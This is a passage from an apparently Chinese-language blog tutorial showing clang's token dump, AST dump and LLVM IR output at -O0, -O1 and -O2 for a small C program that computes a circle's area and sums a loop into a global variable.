Loc=&lt;ex.c:26:41&gt;</span><br><span class="line">identifier &#x27;globalVar&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:26:43&gt;</span><br><span class="line">r_paren &#x27;)&#x27;		Loc=&lt;ex.c:26:52&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:26:53&gt;</span><br><span class="line">return &#x27;return&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:28:5&gt;</span><br><span class="line">numeric_constant &#x27;0&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:28:12&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:28:13&gt;</span><br><span class="line">r_brace &#x27;&#125;&#x27;	 [StartOfLine]	Loc=&lt;ex.c:29:1&gt;</span><br><span class="line">eof &#x27;&#x27;		Loc=&lt;ex.c:29:2&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3语法分析（AST生成）"><a href="#3语法分析（AST生成）" class="headerlink" title="3语法分析（AST生成）"></a>3语法分析（AST生成）</h3><blockquote>
<p>忽略了头文件的ast部分，可以看出主函数由几个声明组成，TranslationUnitDecl作为树根。</p>
<p>clang -E -Xclang -ast-dump ex.c &gt; myparse 2&gt;&amp;1</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TranslationUnitDecl 0xa5e388 &lt;&lt;invalid sloc&gt;&gt; &lt;invalid sloc&gt;</span><br><span class="line">|-TypedefDecl 0xa5ebb0 &lt;&lt;invalid sloc&gt;&gt; &lt;invalid sloc&gt; implicit __int128_t &#x27;__int128&#x27;</span><br><span class="line">| `-BuiltinType 0xa5e950 &#x27;__int128&#x27;</span><br><span class="line">|-TypedefDecl 0xa5ec20 &lt;&lt;invalid sloc&gt;&gt; &lt;invalid sloc&gt; implicit __uint128_t &#x27;unsigned __int128&#x27;</span><br><span class="line">| `-BuiltinType 0xa5e970 &#x27;unsigned __int128&#x27;</span><br><span class="line">|-TypedefDecl 0xa5ef28 &lt;&lt;invalid sloc&gt;&gt; &lt;invalid sloc&gt; implicit __NSConstantString &#x27;struct __NSConstantString_tag&#x27;</span><br><span class="line">| `-RecordType 0xa5ed00 &#x27;struct __NSConstantString_tag&#x27;</span><br><span class="line">|   `-Record 0xa5ec78 &#x27;__NSConstantString_tag&#x27;</span><br><span class="line">|-TypedefDecl 0xa5efc0 &lt;&lt;invalid sloc&gt;&gt; &lt;invalid sloc&gt; implicit __builtin_ms_va_list &#x27;char *&#x27;</span><br><span class="line">.................................</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">|-VarDecl 0xbad2f8 &lt;ex.c:6:1, col:22&gt; col:11 used maxValue &#x27;const int&#x27; cinit</span><br><span class="line">| `-IntegerLiteral 0xbad360 &lt;col:22&gt; &#x27;int&#x27; 100</span><br><span class="line">|-VarDecl 0xbad398 &lt;line:8:1, col:17&gt; col:5 used globalVar &#x27;int&#x27; cinit</span><br><span class="line">| `-IntegerLiteral 0xbad400 &lt;col:17&gt; &#x27;int&#x27; 10</span><br><span class="line">|-FunctionDecl 0xbb4018 &lt;line:10:1, line:12:1&gt; line:10:5 used square &#x27;int (int)&#x27;</span><br><span class="line">| |-ParmVarDecl 0xbb3f80 &lt;col:12, col:16&gt; col:16 used x &#x27;int&#x27;</span><br><span class="line">| `-CompoundStmt 0xbb4160 &lt;col:19, line:12:1&gt;</span><br><span class="line">|   `-ReturnStmt 0xbb4150 &lt;line:11:5, col:16&gt;</span><br><span class="line">|     `-BinaryOperator 0xbb4130 &lt;col:12, col:16&gt; &#x27;int&#x27; &#x27;*&#x27;</span><br><span class="line">|       |-ImplicitCastExpr 0xbb4100 &lt;col:12&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">|       | `-DeclRefExpr 0xbb40c0 &lt;col:12&gt; &#x27;int&#x27; lvalue ParmVar 0xbb3f80 &#x27;x&#x27; &#x27;int&#x27;</span><br><span class="line">|       `-ImplicitCastExpr 0xbb4118 &lt;col:16&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">|         `-DeclRefExpr 0xbb40e0 &lt;col:16&gt; &#x27;int&#x27; lvalue ParmVar 0xbb3f80 &#x27;x&#x27; &#x27;int&#x27;</span><br><span class="line">|-FunctionDecl 0xbb4258 &lt;line:14:1, line:17:1&gt; line:14:6 used printResult &#x27;void (double)&#x27;</span><br><span class="line">| |-ParmVarDecl 0xbb4190 &lt;col:18, col:25&gt; col:25 used radius &#x27;double&#x27;</span><br><span class="line">| `-CompoundStmt 0xbb46a8 &lt;col:33, line:17:1&gt;</span><br><span class="line">|   |-DeclStmt 0xbb44b0 &lt;line:15:5, col:38&gt;</span><br><span class="line">|   | `-VarDecl 0xbb4318 &lt;col:5, col:37&gt; col:12 used area &#x27;double&#x27; cinit</span><br><span class="line">|   |   `-BinaryOperator 0xbb4490 &lt;line:4:12, line:15:37&gt; &#x27;double&#x27; &#x27;*&#x27;</span><br><span class="line">|   |     |-FloatingLiteral 0xbb4380 &lt;line:4:12&gt; &#x27;double&#x27; 3.141593e+00</span><br><span class="line">|   |     `-ImplicitCastExpr 0xbb4478 &lt;line:15:24, col:37&gt; &#x27;double&#x27; &lt;IntegralToFloating&gt;</span><br><span class="line">|   |       `-CallExpr 0xbb4420 &lt;col:24, col:37&gt; &#x27;int&#x27;</span><br><span class="line">|   |         |-ImplicitCastExpr 0xbb4408 &lt;col:24&gt; &#x27;int (*)(int)&#x27; &lt;FunctionToPointerDecay&gt;</span><br><span class="line">|   |         | `-DeclRefExpr 0xbb43a0 &lt;col:24&gt; &#x27;int (int)&#x27; Function 0xbb4018 &#x27;square&#x27; &#x27;int (int)&#x27;</span><br><span class="line">|   |         `-ImplicitCastExpr 0xbb4460 &lt;col:31&gt; &#x27;int&#x27; &lt;FloatingToIntegral&gt;</span><br><span class="line">|   |           `-ImplicitCastExpr 0xbb4448 &lt;col:31&gt; &#x27;double&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">|   |             `-DeclRefExpr 0xbb43c0 &lt;col:31&gt; &#x27;double&#x27; lvalue ParmVar 0xbb4190 &#x27;radius&#x27; &#x27;double&#x27;</span><br><span class="line">|   `-CallExpr 0xbb4610 &lt;line:16:5, col:73&gt; &#x27;int&#x27;</span><br><span class="line">|     |-ImplicitCastExpr 0xbb45f8 &lt;col:5&gt; &#x27;int (*)(const char *, ...)&#x27; &lt;FunctionToPointerDecay&gt;</span><br><span class="line">|     | `-DeclRefExpr 0xbb44c8 &lt;col:5&gt; &#x27;int (const char *, ...)&#x27; Function 0xb083e8 &#x27;printf&#x27; &#x27;int (const char *, ...)&#x27;</span><br><span class="line">|     |-ImplicitCastExpr 0xbb4660 &lt;col:12&gt; &#x27;const char *&#x27; &lt;NoOp&gt;</span><br><span class="line">|     | `-ImplicitCastExpr 0xbb4648 &lt;col:12&gt; &#x27;char *&#x27; &lt;ArrayToPointerDecay&gt;</span><br><span class="line">|     |   `-StringLiteral 0xbb4528 &lt;col:12&gt; &#x27;char[45]&#x27; lvalue &quot;Area of the circle with radius %.2f is %.2f\n&quot;</span><br><span class="line">|     |-ImplicitCastExpr 0xbb4678 &lt;col:61&gt; &#x27;double&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">|     | `-DeclRefExpr 0xbb4570 &lt;col:61&gt; &#x27;double&#x27; lvalue ParmVar 0xbb4190 &#x27;radius&#x27; &#x27;double&#x27;</span><br><span class="line">|     `-ImplicitCastExpr 0xbb4690 &lt;col:69&gt; &#x27;double&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">|       `-DeclRefExpr 0xbb4590 &lt;col:69&gt; &#x27;double&#x27; lvalue Var 0xbb4318 &#x27;area&#x27; &#x27;double&#x27;</span><br><span class="line">`-FunctionDecl 0xbb4720 &lt;line:19:1, line:29:1&gt; line:19:5 main &#x27;int ()&#x27;</span><br><span class="line">  `-CompoundStmt 0xbb4d78 &lt;col:12, line:29:1&gt;</span><br><span class="line">    |-DeclStmt 0xbb4860 &lt;line:20:5, col:24&gt;</span><br><span class="line">    | `-VarDecl 0xbb47d8 &lt;col:5, col:21&gt; col:12 used radius &#x27;double&#x27; cinit</span><br><span class="line">    |   `-FloatingLiteral 0xbb4840 &lt;col:21&gt; &#x27;double&#x27; 5.000000e+00</span><br><span class="line">    |-CallExpr 0xbb4900 &lt;line:21:5, col:23&gt; &#x27;void&#x27;</span><br><span class="line">    | |-ImplicitCastExpr 0xbb48e8 &lt;col:5&gt; &#x27;void (*)(double)&#x27; &lt;FunctionToPointerDecay&gt;</span><br><span class="line">    | | `-DeclRefExpr 0xbb4878 &lt;col:5&gt; &#x27;void (double)&#x27; Function 0xbb4258 &#x27;printResult&#x27; &#x27;void (double)&#x27;</span><br><span class="line">    | `-ImplicitCastExpr 0xbb4928 &lt;col:17&gt; &#x27;double&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">    |   `-DeclRefExpr 0xbb4898 &lt;col:17&gt; &#x27;double&#x27; lvalue Var 0xbb47d8 &#x27;radius&#x27; &#x27;double&#x27;</span><br><span class="line">    |-ForStmt 0xbb4bb8 &lt;line:23:5, line:25:5&gt;</span><br><span class="line">    | |-DeclStmt 0xbb49e0 &lt;line:23:10, col:19&gt;</span><br><span class="line">    | | `-VarDecl 0xbb4958 &lt;col:10, col:18&gt; col:14 used i &#x27;int&#x27; cinit</span><br><span class="line">    | |   `-IntegerLiteral 0xbb49c0 &lt;col:18&gt; &#x27;int&#x27; 0</span><br><span class="line">    | |-&lt;&lt;&lt;NULL&gt;&gt;&gt;</span><br><span class="line">    | |-BinaryOperator 0xbb4a68 &lt;col:21, col:25&gt; &#x27;int&#x27; &#x27;&lt;&#x27;</span><br><span class="line">    | | |-ImplicitCastExpr 0xbb4a38 &lt;col:21&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">    | | | `-DeclRefExpr 0xbb49f8 &lt;col:21&gt; &#x27;int&#x27; lvalue Var 0xbb4958 &#x27;i&#x27; &#x27;int&#x27;</span><br><span class="line">    | | `-ImplicitCastExpr 0xbb4a50 &lt;col:25&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">    | |   `-DeclRefExpr 0xbb4a18 &lt;col:25&gt; &#x27;const int&#x27; lvalue Var 0xbad2f8 &#x27;maxValue&#x27; &#x27;const int&#x27;</span><br><span class="line">    | |-UnaryOperator 0xbb4b00 &lt;col:35, col:36&gt; &#x27;int&#x27; postfix &#x27;++&#x27;</span><br><span class="line">    | | `-DeclRefExpr 0xbb4ae0 &lt;col:35&gt; &#x27;int&#x27; lvalue Var 0xbb4958 &#x27;i&#x27; &#x27;int&#x27;</span><br><span class="line">    | `-CompoundStmt 0xbb4ba0 &lt;col:40, line:25:5&gt;</span><br><span class="line">    |   `-CompoundAssignOperator 0xbb4b70 &lt;line:24:9, col:22&gt; &#x27;int&#x27; &#x27;+=&#x27; ComputeLHSTy=&#x27;int&#x27; ComputeResultTy=&#x27;int&#x27;</span><br><span class="line">    |     |-DeclRefExpr 0xbb4b18 &lt;col:9&gt; &#x27;int&#x27; lvalue Var 0xbad398 &#x27;globalVar&#x27; &#x27;int&#x27;</span><br><span class="line">    |     `-ImplicitCastExpr 0xbb4b58 &lt;col:22&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">    |       `-DeclRefExpr 0xbb4b38 &lt;col:22&gt; &#x27;int&#x27; lvalue Var 0xbb4958 &#x27;i&#x27; &#x27;int&#x27;</span><br><span class="line">    |-CallExpr 0xbb4cd0 &lt;line:26:5, col:52&gt; &#x27;int&#x27;</span><br><span class="line">    | |-ImplicitCastExpr 0xbb4cb8 &lt;col:5&gt; &#x27;int (*)(const char *, ...)&#x27; &lt;FunctionToPointerDecay&gt;</span><br><span class="line">    | | `-DeclRefExpr 0xbb4bf0 &lt;col:5&gt; &#x27;int (const char *, ...)&#x27; Function 0xb083e8 &#x27;printf&#x27; &#x27;int (const char *, ...)&#x27;</span><br><span class="line">    | |-ImplicitCastExpr 0xbb4d18 &lt;col:12&gt; &#x27;const char *&#x27; &lt;NoOp&gt;</span><br><span class="line">    | | `-ImplicitCastExpr 0xbb4d00 &lt;col:12&gt; &#x27;char *&#x27; &lt;ArrayToPointerDecay&gt;</span><br><span class="line">    | |   `-StringLiteral 0xbb4c48 &lt;col:12&gt; &#x27;char[27]&#x27; lvalue &quot;Final globalVar value: %d\n&quot;</span><br><span class="line">    | `-ImplicitCastExpr 0xbb4d30 &lt;col:43&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">    |   `-DeclRefExpr 0xbb4c80 &lt;col:43&gt; &#x27;int&#x27; lvalue Var 0xbad398 &#x27;globalVar&#x27; &#x27;int&#x27;</span><br><span class="line">    `-ReturnStmt 0xbb4d68 &lt;line:28:5, col:12&gt;</span><br><span class="line">      `-IntegerLiteral 0xbb4d48 &lt;col:12&gt; &#x27;int&#x27; 0</span><br></pre></td></tr></table></figure>

<h3 id="4中间代码生成"><a href="#4中间代码生成" class="headerlink" title="4中间代码生成"></a>4<strong>中间代码生成</strong></h3><blockquote>
<p>ir是后端的开始，可以进行代码的优化，最终生成最终的汇编代码。</p>
<p>有了ir，那么为每一种os设计语言就不用考虑后端了，就直接涉及前端即可，只要能生成一样的ir格式。</p>
</blockquote>
<h4 id="无优化"><a href="#无优化" class="headerlink" title="无优化"></a>无优化</h4><blockquote>
<p>clang -S -emit-llvm -fno-discard-value-names ex.c -o ex.ll -O0 -g0</p>
<p>格式和汇编差不多，但是寄存器数量是不受限制的，采用三地址码的格式，但是同一条指令相同寄存器，不能又做源又做汇编。</p>
<p>其中一开始是全局变量的定义，之后分别是函数声明和定义，文件最开头是架构信息为可选项，文件末尾则是一些个函数属性，函数利用#0，#1来选择是哪一个</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; ModuleID = &#x27;ex.c&#x27;</span><br><span class="line">source_filename = &quot;ex.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@maxValue = dso_local constant i32 100, align 4</span><br><span class="line">@globalVar = dso_local global i32 10, align 4</span><br><span class="line">@.str = private unnamed_addr constant [45 x i8] c&quot;Area of the circle with radius %.2f is %.2f\0A\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [27 x i8] c&quot;Final globalVar value: %d\0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @square(i32 noundef %x) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %x.addr = alloca i32, align 4</span><br><span class="line">  store i32 %x, i32* %x.addr, align 4</span><br><span class="line">  %0 = load i32, i32* %x.addr, align 4</span><br><span class="line">  %1 = load i32, i32* %x.addr, align 4</span><br><span class="line">  %mul = mul nsw i32 %0, %1</span><br><span class="line">  ret i32 %mul</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @printResult(double noundef %radius) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %radius.addr = alloca double, align 8</span><br><span class="line">  %area = alloca double, align 8</span><br><span class="line">  store double %radius, double* %radius.addr, align 8</span><br><span class="line">  %0 = load double, double* %radius.addr, align 8</span><br><span class="line">  %conv = fptosi double %0 to i32</span><br><span class="line">  %call = call i32 @square(i32 noundef %conv)</span><br><span class="line">  %conv1 = sitofp i32 %call to double</span><br><span class="line">  %mul = fmul double 0x400921FB54442D18, %conv1</span><br><span class="line">  store double %mul, double* %area, align 8</span><br><span class="line">  %1 = load double, double* %radius.addr, align 8</span><br><span class="line">  %2 = load double, double* %area, align 8</span><br><span class="line">  %call2 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), double noundef %1, double noundef %2)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i32 @printf(i8* noundef, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @main() #0 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %retval = alloca i32, align 4</span><br><span class="line">  %radius = alloca double, align 8</span><br><span class="line">  %i = alloca i32, align 4</span><br><span class="line">  store i32 0, i32* %retval, align 4</span><br><span class="line">  store double 5.000000e+00, double* %radius, align 8</span><br><span class="line">  %0 = load double, double* %radius, align 8</span><br><span class="line">  call void @printResult(double noundef %0)</span><br><span class="line">  store i32 0, i32* %i, align 4</span><br><span class="line">  br label %for.cond</span><br><span class="line"></span><br><span class="line">for.cond:                                         ; preds = %for.inc, %entry</span><br><span class="line">  %1 = load i32, i32* %i, align 4</span><br><span class="line">  %cmp = icmp slt i32 %1, 100</span><br><span class="line">  br i1 %cmp, label %for.body, label %for.end</span><br><span class="line"></span><br><span class="line">for.body:                                         ; preds = %for.cond</span><br><span class="line">  %2 = load i32, i32* %i, align 4</span><br><span class="line">  %3 = load i32, i32* @globalVar, align 4</span><br><span class="line">  %add = add nsw i32 %3, %2</span><br><span class="line">  store i32 %add, i32* @globalVar, align 4</span><br><span class="line">  br label %for.inc</span><br><span class="line"></span><br><span class="line">for.inc:                                          ; preds = %for.body</span><br><span class="line">  %4 = load i32, i32* %i, align 4</span><br><span class="line">  %inc = add nsw i32 %4, 1</span><br><span class="line">  store i32 %inc, i32* %i, align 4</span><br><span class="line">  br label %for.cond, !llvm.loop !6</span><br><span class="line"></span><br><span class="line">for.end:                                          ; preds = %for.cond</span><br><span class="line">  %5 = load i32, i32* @globalVar, align 4</span><br><span class="line">  %call = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 noundef %5)</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;frame-pointer&quot;=&quot;all&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;frame-pointer&quot;=&quot;all&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2, !3, !4&#125;</span><br><span class="line">!llvm.ident = !&#123;!5&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;PIE Level&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;</span><br><span class="line">!4 = !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;</span><br><span class="line">!5 = !&#123;!&quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;&#125;</span><br><span class="line">!6 = distinct !&#123;!6, !7&#125;</span><br><span class="line">!7 = !&#123;!&quot;llvm.loop.mustprogress&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="O1优化"><a href="#O1优化" class="headerlink" title="O1优化"></a>O1优化</h4><blockquote>
<p>可以看出代码少了很多,主要优化部分在main以及print函数，优化点在参数的存储那一部分，无优化的时候每次调用函数的时候都会把参数存放在寄存器中</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; ModuleID = &#x27;ex.c&#x27;</span><br><span class="line">source_filename = &quot;ex.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@maxValue = dso_local local_unnamed_addr constant i32 100, align 4</span><br><span class="line">@globalVar = dso_local local_unnamed_addr global i32 10, align 4</span><br><span class="line">@.str = private unnamed_addr constant [45 x i8] c&quot;Area of the circle with radius %.2f is %.2f\0A\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [27 x i8] c&quot;Final globalVar value: %d\0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: mustprogress nofree norecurse nosync nounwind readnone uwtable willreturn</span><br><span class="line">define dso_local i32 @square(i32 noundef %x) local_unnamed_addr #0 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %mul = mul nsw i32 %x, %x</span><br><span class="line">  ret i32 %mul</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nofree nounwind uwtable</span><br><span class="line">define dso_local void @printResult(double noundef %radius) local_unnamed_addr #1 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %conv = fptosi double %radius to i32</span><br><span class="line">  %mul.i = mul nsw i32 %conv, %conv</span><br><span class="line">  %conv1 = sitofp i32 %mul.i to double</span><br><span class="line">  %mul = fmul double %conv1, 0x400921FB54442D18</span><br><span class="line">  %call2 = call i32 (i8*, ...) @printf(i8* noundef nonnull dereferenceable(1) getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), double noundef %radius, double noundef %mul)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nofree nounwind</span><br><span class="line">declare noundef i32 @printf(i8* nocapture noundef readonly, ...) local_unnamed_addr #2</span><br><span class="line"></span><br><span class="line">; Function Attrs: nofree nounwind uwtable</span><br><span class="line">define dso_local i32 @main() local_unnamed_addr #1 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %call2.i = call i32 (i8*, ...) @printf(i8* noundef nonnull dereferenceable(1) getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), double noundef 5.000000e+00, double noundef 0x4053A28C59D5433B) #3</span><br><span class="line">  %globalVar.promoted = load i32, i32* @globalVar, align 4, !tbaa !5</span><br><span class="line">  %0 = add i32 %globalVar.promoted, 4950</span><br><span class="line">  store i32 %0, i32* @globalVar, align 4, !tbaa !5</span><br><span class="line">  %call = call i32 (i8*, ...) @printf(i8* noundef nonnull dereferenceable(1) getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 noundef %0)</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; mustprogress nofree norecurse nosync nounwind readnone uwtable willreturn &quot;frame-pointer&quot;=&quot;none&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #1 = &#123; nofree nounwind uwtable &quot;frame-pointer&quot;=&quot;none&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #2 = &#123; nofree nounwind &quot;frame-pointer&quot;=&quot;none&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #3 = &#123; nounwind &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2, !3&#125;</span><br><span class="line">!llvm.ident = !&#123;!4&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;PIE Level&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;</span><br><span class="line">!4 = !&#123;!&quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;&#125;</span><br><span class="line">!5 = !&#123;!6, !6, i64 0&#125;</span><br><span class="line">!6 = !&#123;!&quot;int&quot;, !7, i64 0&#125;</span><br><span class="line">!7 = !&#123;!&quot;omnipotent char&quot;, !8, i64 0&#125;</span><br><span class="line">!8 = !&#123;!&quot;Simple C/C++ TBAA&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="O2优化"><a href="#O2优化" class="headerlink" title="O2优化"></a>O2优化</h4><blockquote>
<p>感觉已经和O1没什么区别了,应该优化到尽头了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; ModuleID = &#x27;ex.c&#x27;</span><br><span class="line">source_filename = &quot;ex.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@maxValue = dso_local local_unnamed_addr constant i32 100, align 4</span><br><span class="line">@globalVar = dso_local local_unnamed_addr global i32 10, align 4</span><br><span class="line">@.str = private unnamed_addr constant [45 x i8] c&quot;Area of the circle with radius %.2f is %.2f\0A\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [27 x i8] c&quot;Final globalVar value: %d\0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: mustprogress nofree norecurse nosync nounwind readnone uwtable willreturn</span><br><span class="line">define dso_local i32 @square(i32 noundef %x) local_unnamed_addr #0 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %mul = mul nsw i32 %x, %x</span><br><span class="line">  ret i32 %mul</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nofree nounwind uwtable</span><br><span class="line">define dso_local void @printResult(double noundef %radius) local_unnamed_addr #1 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %conv = fptosi double %radius to i32</span><br><span class="line">  %mul.i = mul nsw i32 %conv, %conv</span><br><span class="line">  %conv1 = sitofp i32 %mul.i to double</span><br><span class="line">  %mul = fmul double %conv1, 0x400921FB54442D18</span><br><span class="line">  %call2 = call i32 (i8*, ...) @printf(i8* noundef nonnull dereferenceable(1) getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), double noundef %radius, double noundef %mul)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nofree nounwind</span><br><span class="line">declare noundef i32 @printf(i8* nocapture noundef readonly, ...) local_unnamed_addr #2</span><br><span class="line"></span><br><span class="line">; Function Attrs: nofree nounwind uwtable</span><br><span class="line">define dso_local i32 @main() local_unnamed_addr #1 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %call2.i = call i32 (i8*, ...) @printf(i8* noundef nonnull dereferenceable(1) getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), double noundef 5.000000e+00, double noundef 0x4053A28C59D5433B) #3</span><br><span class="line">  %globalVar.promoted = load i32, i32* @globalVar, align 4, !tbaa !5</span><br><span class="line">  %0 = add i32 %globalVar.promoted, 4950</span><br><span class="line">  store i32 %0, i32* @globalVar, align 4, !tbaa !5</span><br><span class="line">  %call = call i32 (i8*, ...) @printf(i8* noundef nonnull dereferenceable(1) getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 noundef %0)</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; mustprogress nofree norecurse nosync nounwind readnone uwtable willreturn &quot;frame-pointer&quot;=&quot;none&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #1 = &#123; nofree nounwind uwtable &quot;frame-pointer&quot;=&quot;none&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; 